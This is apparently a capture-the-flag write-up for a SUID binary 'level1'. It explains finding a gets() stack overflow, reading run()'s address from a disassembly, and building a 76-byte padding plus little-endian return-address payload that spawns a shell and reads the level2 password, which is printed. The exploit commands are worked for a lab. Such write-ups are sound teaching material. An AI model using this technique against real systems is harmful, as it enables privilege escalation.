On this level, we got a binary named **level1** (SUID bit set), when we execute it, it seems to wait for an input and leaves after pressing enter.
However, after some tries if we gave an input of 76 characters or more, it respectively those errors : Illegal Instructions and Segmentation fault
Meaning, that something is odd with the input, let's analyze the binary with Ghidra and get the decompiled code.

We got a **run** and a **main** function, where it seems not related.
However, inside the **main** function, there is an use of "gets" (used to reads a line from stdin into his buffer parameter), where the manual specifically says to not use , because no check for buffer overrun is performed and then there is a way to add as much character we wants into the buffer, which can include malevolent code with a buffer overflow attack, for instance.
And inside the **run** function, we got a syscall of /bin/sh (our ticket to get the flag)
So the plan would be to *link* the **main** function to the **run** function. More precisely, to jump from the **main** to the **run** function by manipulating the return address of **main** to be the address of **run**.

With Ghidra, gdb or even objdump, we can get the address of run:

```zsh
08048444 <run>:
 8048444:	55                   	push   %ebp
 8048445:	89 e5                	mov    %esp,%ebp
 8048447:	83 ec 18             	sub    $0x18,%esp
 804844a:	a1 c0 97 04 08       	mov    0x80497c0,%eax
 804844f:	89 c2                	mov    %eax,%edx
 8048451:	b8 70 85 04 08       	mov    $0x8048570,%eax
 8048456:	89 54 24 0c          	mov    %edx,0xc(%esp)
 804845a:	c7 44 24 08 13 00 00 	movl   $0x13,0x8(%esp)
 8048461:	00
 8048462:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
 8048469:	00
 804846a:	89 04 24             	mov    %eax,(%esp)
 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
 8048472:	c7 04 24 84 85 04 08 	movl   $0x8048584,(%esp)
 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
 804847e:	c9                   	leave
 804847f:	c3                   	ret
```
So it's "0x08048444".

Now, we only have to do the payload, which is quite simple, we need to do a padding which is sending 76 characters to fill the buffer and overflow the stack until we get the precise location where the return address of **main**, then after the padding, we send the address of the **run** function in Little Endian format (backwards) because that's the way the CPU reads an address when it's push into the stack, so it would be format as "44 84 04 08" byte by byte.
Finally, when the **main** arrives to `return(0)`, instead of leaving properly, the CPU reads the address that we've injected and jumps directly to the **run** function, opening therefore a shell with level2 permissions.

```zsh
(printf '%.sF' {1..76}; printf '\x44\x84\x04\x08') > /tmp/test
cat /tmp/test - | ./level1

Good... Wait what?


cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

P.S.: To explain our used commands:
	-	(printf '%.sF' {1..76}; printf '\x44\x84\x04\x08') > /tmp/test
	We display "F" as many elements inside the list (1 to 76), indeed "%.sF" will take each arg from the list but without displaying anything then display the character "F"
	Then we display the 4 bytes of the address as hexadecimal value (\ -> escape character), finally we send all the payload inside a temp file to store it in case of future needs.

	-	cat /tmp/test - | ./level1
	We read the file containing the payload and send it to the binary, however to not close the shell we add "-" to cat to let him read STDIN (our inputs) so EOF would never be reached and the shell will be open as much as we want.



